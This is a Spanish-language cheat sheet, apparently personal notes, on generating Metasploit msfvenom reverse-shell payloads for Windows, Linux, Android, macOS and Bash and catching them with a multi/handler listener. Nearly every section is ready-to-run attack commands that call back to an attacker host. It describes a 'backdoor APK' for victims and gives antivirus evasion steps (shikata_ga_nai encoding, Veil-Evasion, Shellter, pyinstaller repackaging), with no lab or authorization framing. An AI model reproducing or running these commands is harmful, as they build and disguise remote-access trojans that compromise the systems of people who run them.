[[MSFVenom🔥]]
## 🔹 **1. Payloads Comunes**

Aquí hay ejemplos de cómo generar payloads para diferentes sistemas operativos.

### 📌 **Windows - Meterpreter Reverse Shell**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

✅ **Genera un archivo `shell.exe` que, cuando se ejecute en la víctima, enviará una conexión inversa a tu máquina.**

---

### 📌 **Linux - Meterpreter Reverse Shell**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf
```

✅ **Genera un ejecutable ELF para Linux.**

---

### 📌 **Android - Backdoor APK**

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f apk -o backdoor.apk
```

✅ **Crea un APK malicioso que, cuando la víctima lo instale, dará acceso remoto.**

---

### 📌 **MacOS - Reverse Shell**

```bash
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o shell.macho
```

✅ **Payload para MacOS en formato `.macho`.**

---

## 🔹 **2. Ejecutar el Payload en Metasploit**

Una vez generado el payload, abre Metasploit y configura un **listener** para recibir conexiones.

1️⃣ **Abrir Metasploit:**

```bash
msfconsole
```

2️⃣ **Configurar el handler:**

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

✅ **Cuando la víctima ejecute el payload, obtendrás acceso remoto con Meterpreter.**

---

## 🔹 **3. Codificar y Ofuscar Payloads**

Los antivirus pueden detectar los payloads generados. Puedes codificarlos para evadir detección.

### 📌 **Ejemplo: Codificar con `shikata_ga_nai`**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_hidden.exe
```

✅ `-e x86/shikata_ga_nai` → Usa el encoder `shikata_ga_nai`.  
✅ `-i 5` → Codifica el payload 5 veces.

---

## 🔹 **4. Formatos de Salida (`-f`)**

Puedes generar payloads en diferentes formatos:

|Formato|Descripción|
|---|---|
|exe|Windows ejecutable|
|elf|Linux ejecutable|
|apk|Android APK|
|macho|MacOS ejecutable|
|raw|Código en bruto|
|c|Código en C|
|python|Código en Python|
|bash|Script en Bash|

Ejemplo:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw
```

✅ **Genera un shell reverso en Bash.**

---

## 🔹 **5. Bypass Antivirus**

Los antivirus detectan payloads estándar. Para evadir detección:

- Usa codificación (`-e x86/shikata_ga_nai`).
- Modifica el código (`-f c` y compílalo manualmente).
- Usa herramientas como **Veil-Evasion** o **Shellter**.

Ejemplo de payload en Python:

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw
```

Después lo modificas en un script `.py` y lo compilas con `pyinstaller`.

---